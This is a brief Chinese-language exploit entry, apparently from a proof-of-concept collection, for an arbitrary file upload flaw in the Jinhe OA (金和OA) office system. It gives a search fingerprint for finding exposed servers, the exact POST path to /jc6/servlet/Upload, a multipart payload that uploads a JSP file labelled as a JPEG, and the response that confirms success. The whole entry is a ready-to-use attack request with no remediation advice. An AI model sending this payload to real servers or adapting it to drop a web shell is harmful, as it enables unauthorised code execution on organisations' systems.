# 金和OAjc6servletUpload接口存在任意文件上传漏洞

金和OA ｜ 文件上传 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1`

**Payload**
```
--ee055230808ca4602e92d0b7c4ecc63d
Content-Disposition: form-data; name="img"; filename="dudesuite.jsp"
Content-Type: image/jpeg
<% out.println("dudesuite"); %>
--ee055230808ca4602e92d0b7c4ecc63d--
```
- **响应特征**：200 .jsp